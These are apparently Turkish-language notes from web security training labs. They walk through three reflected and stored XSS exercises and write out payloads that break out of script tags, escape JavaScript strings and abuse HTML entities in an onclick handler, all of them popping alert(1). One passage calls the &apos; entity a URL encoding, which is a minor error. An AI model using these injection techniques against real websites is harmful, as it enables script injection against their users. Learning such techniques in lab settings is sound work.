
### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
Lab üzerine girdiğimiz zaman gördüğümüz şeyler bir search bar olmaktadır. 
klasik bir "<script> </script>" payloadı giriyoruz ve sonuçları inceleyelim 

incelediğimiz zaman  "</script>" girdimizin js kodunda bir değişken içerisinde yazıldığı için sonrasındaki `js` kodları `script` taginin dışında kalmakta bu sayede kendi istediğimiz script tagımızı koyarak devamını istediğimiz gibi manipüle edebiliriz.


```html
<html>
<script>
a= '</script> <script>alert(1)</script> '
</script>
</html>
```


### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

search bar araştırıldığında `\`ve `//`  encode edilmediği ve js koduna direk olarak iliiştirildiği görülebiliyor. 

```js
\'-alert(1)//
```
şeklinde girildiği zaman

```js
var searchTerms = '\\'-alert(1)//';
```
şeklinde iliştirildiği görülüyor bu şekilde searchterms değişkeninin `'\\'` değerini elde ettiği görülebiliyor. 
//'dan sonrası comment satırı olacaktır.
diğer yöntem:
```
\';alert(1);//
```

"-alert(1)"  kullanılarak ";" kullanmadan çalıştırma yapılabilir.



### Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

Burada comment atarak bir XSS oluşturmamız isteniyor.

website kısmına bakıldığında `onclick` event içerisinde bir fonksiyon yazılarak kullanıcının girdisi bir değişken içerisinde belirtilmiş.

```html
<a id="author" href="[http://foo?](http://foo/?)" onclick="var tracker={track(){}};tracker.track('http://foo?');">xxxxxxxx</a>
```

buradaki onclick fonksiyonuna yazılan değerin manipüle edilmesi gerek `'` `"` gibi değerler encode edilerek önlenmiş.

ancak `'` işaretinin URL encode hali olan `&apos` kullanılarak kaçınılabilir.
```html
<a id="author" href="[http://foo?&apos;-alert(1)-&apos;](http://foo/?%27-alert\(1\)-%27)" onclick="var tracker={track(){}};tracker.track('http://foo?&apos;-alert(1)-&apos;');">asd</a>
```